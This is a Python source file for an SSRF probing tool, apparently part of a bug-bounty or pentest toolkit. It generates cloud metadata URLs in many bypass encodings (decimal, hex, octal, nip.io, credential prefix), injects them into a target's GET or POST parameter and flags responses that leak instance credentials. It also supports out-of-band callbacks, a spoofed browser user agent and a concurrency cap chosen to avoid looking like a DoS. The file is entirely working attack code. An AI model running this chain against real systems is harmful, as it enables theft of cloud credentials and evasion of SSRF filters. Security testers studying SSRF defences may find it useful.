"""
SSRF Probe Chain
Generates cloud metadata payloads with bypass encoding variants,
probes GET/POST parameters, and detects SSRF indicators.

Fixes applied vs v1.0.0:
  - POST supports both form-encoded AND application/json (via --json-post flag)
  - Concurrent probing via asyncio.gather + Semaphore (replaces sequential + 0.25s sleep)
  - SSL InsecureRequestWarning suppressed via urllib3
  - Proxy / extra_headers / cookies wired through client
  - Single AsyncClient per run() — no per-probe TCP overhead
  - Verbose error logging (no more silent failures)
"""

import asyncio
import socket
import struct
import time
import sys
import os
from typing import List, Dict, Any, Optional, Callable
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, quote

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config.patterns import CLOUD_METADATA_ENDPOINTS, SSRF_RESPONSE_INDICATORS

try:
    import httpx
except ImportError:
    print("[!] Missing deps. Run: pip install httpx --break-system-packages")
    sys.exit(1)

# Concurrent probe limit — enough for speed, low enough to not look like DoS
PROBE_CONCURRENCY = 6

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    ),
}

# Extra headers for cloud metadata that require them
CLOUD_EXTRA_HEADERS = {
    "gcp": {"Metadata-Flavor": "Google"},
    "azure": {"Metadata": "true"},
}


# ── IP Encoding Helpers ──────────────────────────────────────────────────────

def ip_to_decimal(ip: str) -> str:
    try:
        packed = socket.inet_aton(ip)
        return str(struct.unpack("!L", packed)[0])
    except Exception:
        return ip


def ip_to_hex(ip: str) -> str:
    try:
        parts = ip.split(".")
        return "0x" + "".join(f"{int(p):02x}" for p in parts)
    except Exception:
        return ip


def ip_to_octal(ip: str) -> str:
    try:
        parts = ip.split(".")
        return ".".join(oct(int(p)) for p in parts)
    except Exception:
        return ip


def ip_to_mixed_encoding(ip: str) -> List[str]:
    """Generate multiple encoding variants of an IP address."""
    variants = []
    parts = ip.split(".")
    if len(parts) != 4:
        return [ip]

    try:
        decimal = ip_to_decimal(ip)
        hex_ip = ip_to_hex(ip)
        octal_ip = ip_to_octal(ip)

        variants.extend([
            decimal,
            hex_ip,
            octal_ip,
            f"0x{int(parts[0]):02x}.{parts[1]}.{parts[2]}.{parts[3]}",
            f"{parts[0]}.{ip_to_decimal('.'.join(parts[1:]))}",
            ip.replace(".", "%2e"),
            f"[::ffff:{ip}]",
        ])
    except Exception:
        pass

    return list(set(variants))


def generate_bypass_variants(original_url: str, cloud: str) -> List[Dict[str, Any]]:
    """Generate bypass variants for a given metadata URL."""
    variants = []
    parsed = urlparse(original_url)

    # Direct original
    variants.append({
        "url": original_url,
        "technique": "direct",
        "bypass": None,
    })

    if "169.254.169.254" in original_url:
        ip = "169.254.169.254"
        for encoded in ip_to_mixed_encoding(ip):
            if encoded != ip:
                new_url = original_url.replace(ip, encoded)
                variants.append({
                    "url": new_url,
                    "technique": "ip_encode",
                    "bypass": encoded,
                })

        variants.extend([
            {
                "url": original_url.replace("http://", "https://"),
                "technique": "proto_https",
                "bypass": "https",
            },
            {
                "url": original_url.replace("http://", "http:///"),
                "technique": "triple_slash",
                "bypass": "http:///",
            },
            {
                "url": f"http://user:pass@169.254.169.254{parsed.path}",
                "technique": "cred_prefix",
                "bypass": "user@host",
            },
            {
                "url": f"http://169.254.169.254.nip.io{parsed.path}",
                "technique": "nip_io",
                "bypass": "nip.io wildcard",
            },
            {
                "url": original_url.replace("http://169.254.169.254", "http://0"),
                "technique": "zero_ip",
                "bypass": "0x0 shorthand",
            },
        ])

    encoded_path = quote(parsed.path, safe="")
    if encoded_path != parsed.path:
        variants.append({
            "url": f"{parsed.scheme}://{parsed.netloc}{encoded_path}",
            "technique": "path_encode",
            "bypass": "URL-encoded path",
        })

    # Deduplicate by URL
    seen: set = set()
    unique = []
    for v in variants:
        if v["url"] not in seen:
            seen.add(v["url"])
            unique.append(v)

    return unique


# ── Main Prober ──────────────────────────────────────────────────────────────

class SSRFProbe:
    def __init__(
        self,
        target_url: str,
        parameter: str,
        oob_host: Optional[str] = None,
        timeout: int = 10,
        clouds: Optional[List[str]] = None,
        follow_redirects: bool = False,
        json_post: bool = False,
        verbose: bool = False,
        proxy: Optional[str] = None,
        extra_headers: Optional[Dict[str, str]] = None,
        cookies: Optional[str] = None,
    ):
        self.target_url = target_url
        self.parameter = parameter
        self.oob_host = oob_host
        self.timeout = timeout
        self.clouds = clouds or list(CLOUD_METADATA_ENDPOINTS.keys())
        self.follow_redirects = follow_redirects
        self.json_post = json_post   # FIX: POST as JSON instead of form-encoded
        self.verbose = verbose
        self.findings: List[Dict[str, Any]] = []

        merged_headers = {**HEADERS, **(extra_headers or {})}
        cookie_dict: Dict[str, str] = {}
        if cookies:
            for part in cookies.split(";"):
                k, _, v = part.strip().partition("=")
                if k:
                    cookie_dict[k.strip()] = v.strip()

        self._client_opts: Dict[str, Any] = {
            "timeout": self.timeout,
            "follow_redirects": self.follow_redirects,
            "verify": False,
            "headers": merged_headers,
        }
        if proxy:
            self._client_opts["proxy"] = proxy
        if cookie_dict:
            self._client_opts["cookies"] = cookie_dict

    def build_all_payloads(self) -> List[Dict[str, Any]]:
        """Generate the full payload list across all selected clouds."""
        payloads = []

        for cloud in self.clouds:
            endpoints = CLOUD_METADATA_ENDPOINTS.get(cloud, [])
            for base_url in endpoints:
                for variant in generate_bypass_variants(base_url, cloud):
                    payloads.append({
                        "cloud": cloud,
                        "base_url": base_url,
                        "url": variant["url"],
                        "technique": variant["technique"],
                        "bypass": variant["bypass"],
                    })

        if self.oob_host:
            for proto in ("http", "https"):
                payloads.append({
                    "cloud": "oob",
                    "base_url": f"{proto}://{self.oob_host}/",
                    "url": f"{proto}://{self.oob_host}/rxhunt-ssrf-probe",
                    "technique": "oob_callback",
                    "bypass": None,
                })

        return payloads

    def _inject_get(self, payload_url: str) -> str:
        """Inject payload into GET parameter."""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[self.parameter] = [payload_url]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _detect_ssrf(self, status: int, body: str, elapsed: float) -> str:
        """Heuristic SSRF detection. Returns indication level."""
        body_lower = body.lower()

        for indicator in SSRF_RESPONSE_INDICATORS:
            if indicator in body_lower:
                return "CONFIRMED_SSRF"

        if status == 200 and len(body) > 20:
            if any(kw in body_lower for kw in ["meta", "instance", "credential", "token"]):
                return "POTENTIAL_SSRF"

        if elapsed > (self.timeout * 0.85):
            return "TIMEOUT_BLIND_POSSIBLE"

        if status in (500, 502, 503) and len(body) < 200:
            return "ERROR_BLIND_POSSIBLE"

        return "none"

    async def _probe_once(
        self,
        client: httpx.AsyncClient,
        payload: Dict[str, Any],
        method: str = "GET",
    ) -> Dict[str, Any]:
        """Probe a single payload. Reuses provided client."""
        result = {
            "payload": payload,
            "method": method,
            "probe_url": "",
            "status": None,
            "elapsed": None,
            "response_length": None,
            "indication": "none",
            "snippet": "",
        }

        extra_headers = CLOUD_EXTRA_HEADERS.get(payload["cloud"], {})
        request_headers = {**HEADERS, **extra_headers}

        try:
            t0 = time.monotonic()

            if method.upper() == "GET":
                probe_url = self._inject_get(payload["url"])
                result["probe_url"] = probe_url
                resp = await client.get(probe_url, headers=request_headers)
            else:
                result["probe_url"] = self.target_url
                if self.json_post:
                    # FIX: JSON POST for modern APIs (was form-encoded only before)
                    resp = await client.post(
                        self.target_url,
                        json={self.parameter: payload["url"]},
                        headers={**request_headers, "Content-Type": "application/json"},
                    )
                else:
                    # Legacy form-encoded — kept as default for backwards compat
                    resp = await client.post(
                        self.target_url,
                        data={self.parameter: payload["url"]},
                        headers=request_headers,
                    )

            elapsed = time.monotonic() - t0
            body = resp.text

            result["status"] = resp.status_code
            result["elapsed"] = round(elapsed, 3)
            result["response_length"] = len(body)
            result["snippet"] = body[:400]
            result["indication"] = self._detect_ssrf(resp.status_code, body, elapsed)

        except httpx.TimeoutException:
            result["indication"] = "TIMEOUT_BLIND_POSSIBLE"
            result["elapsed"] = self.timeout
            if self.verbose:
                print(f"[verbose] probe timeout → {payload['url']}")
        except Exception as e:
            result["indication"] = "error"
            result["snippet"] = str(e)[:100]
            if self.verbose:
                print(f"[verbose] probe error → {payload['url']} ({type(e).__name__}: {e})")

        return result

    async def run(
        self,
        method: str = "GET",
        progress_callback: Optional[Callable[[int, int, str], None]] = None,
        stop_on_confirm: bool = True,
    ) -> List[Dict[str, Any]]:
        """
        Run the full probe chain.

        FIX: Now concurrent via asyncio.gather + Semaphore(PROBE_CONCURRENCY).
        Original was sequential with asyncio.sleep(0.25) per probe — 100 payloads
        meant 25+ seconds of sleep alone. Concurrency cuts that dramatically.

        stop_on_confirm still works: we track a shared flag and skip remaining tasks.
        """
        payloads = self.build_all_payloads()
        total = len(payloads)
        results: List[Dict[str, Any]] = [None] * total  # preserve order
        sem = asyncio.Semaphore(PROBE_CONCURRENCY)
        confirmed = asyncio.Event()
        completed = 0

        async def probe_task(idx: int, payload: Dict[str, Any]) -> None:
            nonlocal completed
            if stop_on_confirm and confirmed.is_set():
                return  # short-circuit after first confirmed SSRF

            async with sem:
                if stop_on_confirm and confirmed.is_set():
                    return

                result = await self._probe_once(client, payload, method)
                results[idx] = result
                completed += 1

                if progress_callback:
                    progress_callback(completed, total, payload["url"])

                if stop_on_confirm and result["indication"] == "CONFIRMED_SSRF":
                    confirmed.set()

        async with httpx.AsyncClient(**self._client_opts) as client:
            tasks = [probe_task(i, p) for i, p in enumerate(payloads)]
            await asyncio.gather(*tasks)

        # Filter out None slots (skipped after confirm) and append note if halted
        final: List[Dict[str, Any]] = [r for r in results if r is not None]
        if confirmed.is_set():
            final.append({"__note__": "Confirmed SSRF — probe chain halted early."})

        self.findings = [
            r for r in final
            if isinstance(r, dict)
            and r.get("indication") not in ("none", "error", None)
            and "__note__" not in r
        ]

        return final
